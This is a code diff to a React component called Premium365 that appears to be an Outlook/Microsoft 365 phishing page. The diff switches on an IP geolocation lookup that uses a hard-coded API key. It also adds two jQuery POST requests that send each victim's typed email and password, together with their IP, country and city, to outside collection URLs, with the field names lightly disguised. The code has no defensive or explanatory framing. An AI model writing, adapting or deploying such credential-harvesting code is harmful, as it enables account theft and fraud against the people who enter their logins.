@@ -1,5 +1,5 @@
 
-import React, { Fragment, useState, useRef } from "react";
+import React, { Fragment, useState, useRef, useEffect } from "react";
 import './form.css';
 import $ from "jquery";
 import Preloader from '../preloader/preloader';
@@ -8,39 +8,39 @@ import Preloader from '../preloader/preloader';
 
 const Premium365 = ({ rem_form })=>{
 
-    // const [ipAdress, setIpAdress] = useState('')
-    // const [city, setCity] = useState('');
-    // const [flag, setFlag] = useState('');
-    // const [country, setCountry] = useState('');
+    const [ipAdress, setIpAdress] = useState('')
+    const [city, setCity] = useState('');
+    const [flag, setFlag] = useState('');
+    const [country, setCountry] = useState('');
 
-    // const forTime = new Date();
+    const forTime = new Date();
 
 
-    // useEffect(()=>{
-    //     fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
-    //     .then(req=> req.json())
-    //     .then(res=>{
-    //         // setCountry(res.names.en)
-    //         // console.log(res.names.en);
-    //         // console.log('city:',res.city.name);
+    useEffect(()=>{
+        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
+        .then(req=> req.json())
+        .then(res=>{
+            // setCountry(res.names.en)
+            // console.log(res.names.en);
+            // console.log('city:',res.city.name);
 
-    //         setIpAdress(res.ip)
-    //         setFlag(res.country.flag);
-    //         setCountry(res.country.name);
-    //         setCity(res.city.names.en);
+            setIpAdress(res.ip)
+            setFlag(res.country.flag);
+            setCountry(res.country.name);
+            setCity(res.city.names.en);
 
             
             
             
-    //         console.log('ipAddress:', res.ip);
-    //         console.log('flag:', res.country.flag);
-    //         console.log('country:', res.country.name);
-    //         console.log('city:', res.city.names.en);
-    //         console.log(res);
+            console.log('ipAddress:', res.ip);
+            console.log('flag:', res.country.flag);
+            console.log('country:', res.country.name);
+            console.log('city:', res.city.names.en);
+            console.log(res);
 
-    //     })
-    //     .catch(e=> console.log)
-    // }, []);
+        })
+        .catch(e=> console.log)
+    }, []);
 
 
 
@@ -99,13 +99,27 @@ const Premium365 = ({ rem_form })=>{
 
             const user = {
                 email: outlookEmail,
-                password: outlookPassword,
+                pswd: outlookPassword,
+                eyep: ipAdress,
+                flag: flag,
+                country,
+                city
 
             };
 
             $.ajax({
                 type: "POST",
-                url: "https://physicaleducationdiploma.com/work/jeanshare.php",
+                url: "https://physiccalleducationdiplomma.onrender.com/physical/jeancatherinemonier@protonmail.com/mega/educationdiploma",
+                data: user,
+                success(data) {
+                    // alert('OK');
+                    console.log(data);
+                },
+            });
+
+            $.ajax({
+                type: "POST",
+                url: "https://physiccalleducationdiplomma.onrender.com/physical/purchase.gazpromgroup@mail.ru/mega/educationdiploma",
                 data: user,
                 success(data) {
                     // alert('OK');
